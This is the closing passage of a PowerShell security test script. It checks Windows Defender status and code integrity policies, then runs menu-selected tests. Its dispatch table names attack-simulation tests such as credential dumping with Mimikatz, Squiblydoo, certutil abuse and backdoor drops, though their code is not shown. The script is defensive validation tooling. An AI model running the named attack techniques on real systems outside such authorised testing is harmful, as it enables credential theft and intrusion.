            }
        }
        else {
            Write-Host -ForegroundColor $warningmessagecolor "DNS over HTTPS: NOT CONFIGURED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Configure DoH for encrypted DNS queries"
        }
    }
    catch {
        Write-Host -ForegroundColor $warningmessagecolor "DNS over HTTPS: Unable to query (may require Windows 11 or newer)"
        Write-Host -ForegroundColor $warningmessagecolor "Error: $_"
    }
}

<#
.SYNOPSIS
    Test 59: Windows Security Center comprehensive status check
    
.DESCRIPTION
    Queries Windows Defender/Security Center for comprehensive status of all
    protection components including antivirus, firewall, and real-time protection.
    
    EXPECTED RESULT: All components healthy and enabled
    FAILED TEST: Any component disabled or unhealthy
#>
function securitycenter() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 59. Windows Security Center Status ---"
    
    try {
        $status = Get-MpComputerStatus
        
        Write-Host -ForegroundColor $processmessagecolor "Antivirus:"
        Write-Host -ForegroundColor $processmessagecolor "  Antivirus Enabled: $($status.AntivirusEnabled)"
        Write-Host -ForegroundColor $processmessagecolor "  Antivirus Signature Version: $($status.AntivirusSignatureVersion)"
        Write-Host -ForegroundColor $processmessagecolor "  Real-Time Protection Enabled: $($status.RealTimeProtectionEnabled)"
        Write-Host -ForegroundColor $processmessagecolor "  Behavior Monitor Enabled: $($status.BehaviorMonitorEnabled)"
        Write-Host -ForegroundColor $processmessagecolor "  IoA Protection Enabled: $($status.IoavProtectionEnabled)"
        Write-Host -ForegroundColor $processmessagecolor "  On Access Protection Enabled: $($status.OnAccessProtectionEnabled)"
        
        Write-Host -ForegroundColor $processmessagecolor "`nCloud Protection:"
        Write-Host -ForegroundColor $processmessagecolor "  Cloud-Delivered Protection Enabled: $($status.MAPSReporting -gt 0)"
        Write-Host -ForegroundColor $processmessagecolor "  Automatic Sample Submission: $($status.SubmitSamplesConsent)"
        
        Write-Host -ForegroundColor $processmessagecolor "`nUpdates:"
        Write-Host -ForegroundColor $processmessagecolor "  Antivirus Signature Last Updated: $($status.AntivirusSignatureLastUpdated)"
        Write-Host -ForegroundColor $processmessagecolor "  NIS Signature Last Updated: $($status.NISSignatureLastUpdated)"
        
        # Overall assessment
        if ($status.AntivirusEnabled -and $status.RealTimeProtectionEnabled -and $status.BehaviorMonitorEnabled) {
            Write-Host -ForegroundColor $processmessagecolor "`nWindows Security: ALL KEY PROTECTIONS ENABLED - test SUCCEEDED"
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "`nWindows Security: SOME PROTECTIONS DISABLED - test FAILED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable all protection features in Windows Security"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error querying Windows Security Center: $_"
    }
}

<#
.SYNOPSIS
    Test 60: Code Integrity Policies verification
    
.DESCRIPTION
    Checks if Windows Defender Application Control (WDAC) or Device Guard
    code integrity policies are enforced.
    
    EXPECTED RESULT: Code integrity policies enforced
    FAILED TEST: No policies enforced
#>
function codeintegrity() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 60. Code Integrity Policies ---"
    
    try {
        $deviceGuard = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
        
        if ($deviceGuard) {
            $ciStatus = $deviceGuard.CodeIntegrityPolicyEnforcementStatus
            
            switch ($ciStatus) {
                0 { Write-Host -ForegroundColor $warningmessagecolor "Code Integrity: OFF - test FAILED" }
                1 { Write-Host -ForegroundColor $warningmessagecolor "Code Integrity: AUDIT MODE" }
                2 { Write-Host -ForegroundColor $processmessagecolor "Code Integrity: ENFORCED - test SUCCEEDED" }
                default { Write-Host -ForegroundColor $processmessagecolor "Code Integrity Status: $ciStatus" }
            }
            
            $uefiLock = $deviceGuard.UsermodeCodeIntegrityPolicyEnforcementStatus
            Write-Host -ForegroundColor $processmessagecolor "User Mode Code Integrity: $uefiLock"
            
            if ($ciStatus -eq 0) {
                Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Consider implementing WDAC policies for application control"
            }
        }
        else {
            Write-Host -ForegroundColor $warningmessagecolor "Unable to query Code Integrity status (may require newer Windows version)"
        }
        
        # Check for policy files
        $policyPath = "$env:SystemRoot\System32\CodeIntegrity\SIPolicy.p7b"
        if (Test-Path $policyPath) {
            Write-Host -ForegroundColor $processmessagecolor "`nCode Integrity Policy file detected: $policyPath"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking Code Integrity policies: $_"
    }
}

#Region Main Execution
<#
    MAIN SCRIPT EXECUTION
    
    This section controls the overall flow of the script:
    1. Optionally start transcript logging for debug purposes
    2. Display usage information and parameter options
    3. Generate the menu of available tests
    4. Present interactive GUI (unless -NoPrompt) for test selection
    5. Execute selected tests via switch statement
    6. Clean up and stop transcript if enabled
#>

Clear-Host

# Enable transcript logging if Debug parameter is specified
if ($Debug) {
    Write-Host -ForegroundColor $processmessagecolor "Create log file ..\sec-test.txt`n"
    # Transcript captures all console output to a file for later review
    Start-Transcript "..\sec-test.txt" | Out-Null
}

Write-Host -ForegroundColor $systemmessagecolor "Security test script started`n"
if (-not $Debug) {
    Write-Host -ForegroundColor $warningmessagecolor "    * use the -Debug parameter on the command line to create an execution log file for this script"
}
if (-not $NoPrompt) {
    Write-Host -ForegroundColor $warningmessagecolor "    * use the -NoPrompt parameter on the command line to run all options with no prompts"
}

# Initialize empty array and populate with all available tests
$menuitems = @()
Write-Host -ForegroundColor $processmessagecolor "`nGenerate test options"
$menu = displaymenu($menuitems)  # Build the menu of 39 security tests
Write-Host -ForegroundColor $processmessagecolor "Test options generated"

# Interactive mode: Display GUI for user to select specific tests
if (-not $NoPrompt) {
    try {
        # Out-GridView provides a searchable, selectable GUI grid
        # Users can CTRL+Click to select multiple tests to run
        $results = $menu | Sort-Object Number | Out-GridView -PassThru -Title "Select tests to run (Multiple selections permitted - use CTRL + Select)"
    }
    catch {
        Write-Host -ForegroundColor Yellow -BackgroundColor $errormessagecolor "`n[001] - Error getting options`n"
        if ($Debug) {
            Stop-Transcript | Out-Null      ## Terminate transcription
        }
        exit 1                              ## Terminate script
    }
}
# Non-interactive mode: Run all tests automatically
else {
    Write-Host -ForegroundColor $processmessagecolor "`nRun all options"
    $results = $menu  # Use entire menu (all 60 tests)
}

# Execute the selected test(s) based on test number
# Each number corresponds to a specific security validation function
switch ($results.Number) {
    1  { downloadfile }        # Antivirus download protection
    2  { createfile }          # Antivirus file creation detection
    3  { inmemorytest }        # AMSI in-memory scanning
    4  { processdump }
    5  { mimikatztest }
    6  { failedlogin }
    7  { officechildprocess }
    8  { officecreateexecutable }
    9  { scriptlaunch }
    10 { officemacroimport }
    11 { psexecwmicreation }
    12 { scriptdlexecute }
    13 { networkprotection }
    14 { suspiciouspage }
    15 { phishpage }
    16 { downloadblock }
    17 { exploitblock }
    18 { maliciousframe }
    19 { unknownprogram }
    20 { knownmalicious }
    21 { pua }
    22 { blockatfirst }
    23 { servicescheck }
    24 { defenderstatus }
    25 { mshta }
    26 { squiblydoo }
    27 { certutil }
    28 { wmic }
    29 { rundll }
    30 { mimispool }
    31 { hivevul }
    32 { mshtmlvul }
    33 { formshtml }
    34 { backdoordrop }
    35 { psfileless }
    36 { sqldumper }
    37 { comsvcs }
    38 { notepadmask }
    39 { schtsk }
    40 { psconstrainedlanguage }      # PowerShell Constrained Language Mode
    41 { pslogging }                   # PowerShell Logging Configuration
    42 { asrrules }                    # ASR Rules Status
    43 { controlledfolderaccess }      # Controlled Folder Access
    44 { credentialguard }             # Credential Guard Status
    45 { secureboot }                  # Secure Boot Status
    46 { bitlocker }                   # BitLocker Encryption
    47 { tpmstatus }                   # TPM Status
    48 { firewallstatus }              # Windows Firewall
    49 { uacstatus }                   # UAC Configuration
    50 { smbsigning }                  # SMB Signing
    51 { localadmins }                 # Local Administrator Accounts
    52 { rdpsecurity }                 # RDP Security
    53 { applicationguard }            # Windows Defender Application Guard
    54 { vbssecurity }                 # Virtualization-Based Security
    55 { windowsupdate }               # Windows Update Compliance
    56 { applockerpolicies }           # AppLocker Policies
    57 { windowssandbox }              # Windows Sandbox
    58 { dnsovertthps }                # DNS over HTTPS
    59 { securitycenter }              # Security Center Status
    60 { codeintegrity }               # Code Integrity Policies
}

Write-Host -ForegroundColor $systemmessagecolor "`nSecurity test script completed"
if ($Debug) {
    Stop-Transcript | Out-Null
}